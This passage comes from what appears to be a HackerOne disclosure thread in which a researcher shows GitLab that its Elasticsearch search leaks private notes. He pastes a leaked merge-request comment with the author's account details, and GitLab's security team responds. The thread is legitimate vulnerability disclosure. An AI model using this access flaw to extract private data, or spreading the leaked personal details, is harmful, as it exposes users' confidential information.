You will have as result a private note saying `Riccardo Padovani mentioned in nextbit/virtualcore/gui#109` (see screenshot). This basically leaks information about the existence of a private group, a private subgroup, a private project, the ID of an issue in the project, and a membership of the project. 3.

There was actually a bug logged a long time ago and so the implementation here wasn't in sync with what's being used within the gitlab product. I didn't tackle all the issues there, but I fixed it up enough that it's tracking correctly now. @eli_kastelein, @mpeychet you might not want to trust current customers tracking data because it's using a broken version (2.10.2) with the local storage setting -- https://discourse.snowplowanalytics.com/t/session-not-tracked-correctly/3026, and fixed in https://github.com/snowplow/snowplow-javascript-tracker/pull/761. When I implemented the tests for tracking I uncovered this, and the result appears to be that when an event was added it would just retrack the initial event that was logged. This means you might have really inflated data, and I'd recommend clearing it out if that's possible and you can confirm I'm correct.\",\n    \"attachment\": null,\n    \"author\": {\n      \"id\": 4303974,\n      \"name\": \"Jeremy Jackson\",\n      \"username\": \"jejacks0n\",\n      \"state\": \"active\",\n      \"avatar_url\": \"https://assets.gitlab-static.net/uploads/-/system/user/avatar/4303974/avatar.png\",\n      \"web_url\": \"https://gitlab.com/jejacks0n\"\n    },\n    \"created_at\": \"2019-11-04T21:10:41.148Z\",\n    \"updated_at\": \"2019-11-05T07:33:07.584Z\",\n    \"system\": false,\n    \"noteable_id\": 39021260,\n    \"noteable_type\": \"MergeRequest\",\n    \"resolvable\": true,\n    \"resolved\": false,\n    \"resolved_by\": null,\n    \"noteable_iid\": 520\n  }\n]\n```\n\nI also think that since not only metadata are leaked, but actually data, the severity of this vulnerability is actually higher","automated_response":false,"created_at":"2019-11-05T10:51:44.555Z","updated_at":"2019-11-05T10:51:44.555Z","actor":{"username":"rpadovani","cleared":false,"url":"/rpadovani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/236/751/01f4c6286f531a1d26559ab1bd2f61a34d74792f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6220312,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for the very fast feedback @rpadovani,\n\nCould you please open a new report ?\nWe will disable Elasticsearch ASAP.\n\nBest regards,\nSecurity Team | GitLab Inc.","automated_response":false,"created_at":"2019-11-05T11:02:23.065Z","updated_at":"2019-11-05T11:02:23.065Z","actor":{"username":"jmatos_bgtvf","cleared":false,"url":"/jmatos_bgtvf","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6220357,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for your fast acknowledgement.
